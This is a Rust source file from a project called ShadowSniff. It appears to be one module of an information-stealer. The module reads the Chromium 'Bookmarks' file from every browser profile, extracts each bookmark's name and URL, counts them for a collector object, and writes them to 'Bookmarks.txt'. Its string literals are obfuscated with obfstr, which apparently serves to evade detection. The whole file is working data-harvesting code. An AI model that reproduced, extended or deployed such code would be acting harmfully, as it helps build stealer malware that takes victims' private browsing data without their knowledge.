/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{Bookmark, collect_unique_from_profiles, to_string_and_write_all};
use alloc::sync::Arc;
use alloc::vec;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use json::{Value, parse};
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

#[derive(new)]
pub(super) struct BookmarksTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for BookmarksTask {
    parent_name!("Bookmarks.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(bookmarks) = collect_unique_from_profiles(&self.browser.profiles, |profile| {
            read_bookmarks(&StorageFileSystem, profile)
        }) else {
            return;
        };

        collector
            .get_browser()
            .increase_bookmarks_by(bookmarks.len());
        let _ = to_string_and_write_all(&bookmarks, "\n\n", filesystem, parent);
    }
}

fn read_bookmarks<F>(filesystem: &F, profile: &Path) -> Option<Vec<Bookmark>>
where
    F: FileSystem,
{
    let content = filesystem.read_file(profile / s!("Bookmarks")).ok()?;
    let json = parse(&content).ok()?;

    let roots = json.get(s!("roots"))?;

    let bookmarks: Vec<Bookmark> = [s!("bookmark_bar"), s!("other"), s!("synced")]
        .iter()
        .filter_map(|root| roots.get(root.as_ref()))
        .flat_map(extract_bookmarks)
        .collect();

    Some(bookmarks)
}

fn extract_bookmarks(root: Value) -> Vec<Bookmark> {
    let mut bookmarks = Vec::new();
    let mut stack = vec![root];

    while let Some(current) = stack.pop() {
        if let Some(obj) = current.as_object() {
            if let (Some(name_val), Some(url_val)) = (obj.get("name"), obj.get("url"))
                && let (Some(name), Some(url)) = (name_val.as_string(), url_val.as_string())
            {
                bookmarks.push(Bookmark {
                    name: name.clone(),
                    url: url.clone(),
                });
            }

            if let Some(children_val) = obj.get("children")
                && let Some(children) = children_val.as_array()
            {
                for child in children.iter().rev() {
                    stack.push(child.clone());
                }
            }
        }
    }

    bookmarks
}
